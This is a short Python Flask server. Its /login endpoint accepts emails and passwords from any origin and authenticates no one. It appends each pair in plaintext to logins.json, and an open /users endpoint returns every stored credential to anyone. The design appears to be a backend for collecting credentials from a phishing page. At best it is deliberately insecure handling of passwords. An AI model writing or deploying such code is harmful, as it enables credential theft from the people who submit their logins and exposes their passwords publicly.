from flask import Flask, request, jsonify
from flask_cors import CORS
import json
import os

app = Flask(__name__)
CORS(app, resources={r"/login": {"origins": "*"}, r"/users": {"origins": "*"}})

@app.route('/login', methods=['POST'])
def login():
    if request.is_json:
        data = request.get_json()
        email = data.get('email')
        password = data.get('password')
    else:
        # دي الحالة بتاعت الفورم العادي
        email = request.form.get('email')
        password = request.form.get('password')

    if not email or not password:
        return jsonify({'error': 'Missing email or password'}), 400

    with open('logins.json', 'a') as f:
        json.dump({'email': email, 'password': password}, f)
        f.write('\n')

    return jsonify({'message': 'Login data received successfully'}), 200

@app.route('/users', methods=['GET'])
def get_users():
    users = []
    if os.path.exists('logins.json'):
        with open('logins.json', 'r') as f:
            for line in f:
                try:
                    users.append(json.loads(line))
                except json.JSONDecodeError:
                    continue
    return jsonify(users), 200
if __name__ == '__main__':
  app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))


